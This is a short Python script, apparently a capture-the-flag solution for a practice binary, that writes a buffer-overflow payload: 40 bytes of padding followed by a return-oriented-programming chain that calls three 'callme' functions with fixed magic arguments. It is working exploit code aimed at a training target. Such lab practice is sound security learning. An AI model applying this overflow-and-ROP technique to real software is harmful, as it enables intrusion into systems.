#!/usr/bin/python3

import sys

POP_RDI_RSI_RDX_ADDR = 0x0040093c 
PLT_CALLME_THREE = 0x004006f0
PLT_CALLME_TWO = 0x00400740
PLT_CALLME_ONE = 0x00400720
USEFUL_FUNC = 0x004008f2


newstack = [
        POP_RDI_RSI_RDX_ADDR,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        PLT_CALLME_ONE,

        POP_RDI_RSI_RDX_ADDR,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        PLT_CALLME_TWO,
        
        POP_RDI_RSI_RDX_ADDR,
        0xdeadbeefdeadbeef,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        PLT_CALLME_THREE,
]

sys.stdout.buffer.write(b'A'*40)

for v in newstack:
    sys.stdout.buffer.write(v.to_bytes(8, byteorder="little"))
